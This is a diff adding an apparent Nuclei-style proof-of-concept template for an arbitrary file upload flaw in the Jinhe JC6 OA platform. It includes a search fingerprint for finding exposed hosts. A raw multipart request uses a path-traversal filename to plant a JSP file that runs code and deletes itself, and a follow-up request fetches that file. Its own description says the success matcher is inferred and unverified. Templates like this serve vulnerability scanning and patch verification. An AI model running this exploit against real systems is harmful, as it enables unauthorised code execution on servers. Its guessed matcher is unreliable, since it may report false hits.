@@ -1,0 +1,74 @@
+id: poc-45cdd5580afb90fbfce4
+info:
+  name: 金和OAJC6ntko-upload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/45cdd5580afb90fbfce47a8aaf1defd7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 45cdd5580afb90fbfce47a8aaf1defd7
+    fofa: + hunter`web.body="JC6金和协同管理平台"`
+http:
+- raw:
+  - 'POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-Length: 439
+
+    Connection: close
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="filename"
+
+
+    ../../../../upload/stc.jsp
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="upLoadFile"; filename="stc.jpg"
+
+    Content-Type: image/jpeg
+
+
+    <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    upload
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /upload/stc.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
